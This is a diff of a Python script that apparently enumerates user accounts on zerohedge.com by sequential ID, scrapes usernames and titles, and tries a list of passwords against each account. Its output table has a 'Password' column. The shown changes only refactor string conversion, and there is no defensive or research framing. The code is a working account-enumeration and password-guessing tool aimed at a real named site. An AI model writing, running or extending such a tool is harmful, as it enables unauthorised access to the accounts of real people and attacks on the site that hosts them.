@@ -6,8 +6,7 @@ import time
 def output(entry):
 	number = 0
 	for item in entry:
-		sys.stdout.write(str(item) + \
-			" " * ([8, 32, 32, 8][number] - len(str(item))))
+		sys.stdout.write(item + " " * ([8, 32, 32, 8][number] - len(item)))
 		number += 1
 	sys.stdout.write("\n")
 
@@ -24,8 +23,7 @@ def attempt(entry, passwords):
 def evaluate(number, passwords):
 	try:
 		entry = [number]
-		response = requests.get("http://zerohedge.com/user/" + \
-			str(number)).text
+		response = requests.get("http://zerohedge.com/user/" + number).text
 		if "Page Not Found" not in response:
 			entry.append(response[response.index("canonical") + \
 				48:response.index("og:url") - 21])
@@ -39,7 +37,7 @@ def main(passwords):
 	output(["Number", "Username", "Title", "Password"])
 	number = 0
 	while True:
-		evaluate(number, passwords)
+		evaluate(str(number), passwords)
 		number += 1
 
 if __name__ == "__main__":
